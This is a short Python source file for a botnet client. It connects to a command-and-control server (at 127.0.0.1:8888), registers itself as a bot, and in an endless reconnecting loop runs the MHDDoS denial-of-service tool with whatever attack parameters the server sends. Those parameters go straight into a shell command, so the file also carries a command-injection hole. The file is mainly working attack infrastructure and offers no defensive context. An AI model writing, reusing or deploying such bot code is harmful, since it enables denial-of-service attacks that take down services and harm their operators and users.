import asyncio
import time
import subprocess
import os

CUR_DIR = os.path.dirname(os.path.realpath(__file__))
MHDDoS = CUR_DIR + os.sep + 'MHDDoS' + os.sep + 'start.py'

async def start_bot():
    reader, writer = await asyncio.open_connection('127.0.0.1', 8888)
    reg_cmd = f'register bot-{time.time()}'
    writer.write(reg_cmd.encode())
    await writer.drain()
    print('Connected to C&C Server')
    while True:
        data = await reader.read(100)
        if not data:
            break
        message = data.decode()
        print(f"Command received from C&C Server: {message}")
        attack_para = message.split(' ',1)[1]
        print(f'attack para: {attack_para}')
        attack_cmd = f'python3 {MHDDoS} {attack_para}'
        print(f'attack cmd: {attack_cmd}')
        result = subprocess.run(attack_cmd, shell=True, capture_output=True, text=True)
        print(f'result: {result.stdout}')

while True:
    asyncio.run(start_bot())
    print('bot is disconected, will restart again')
    time.sleep(10)
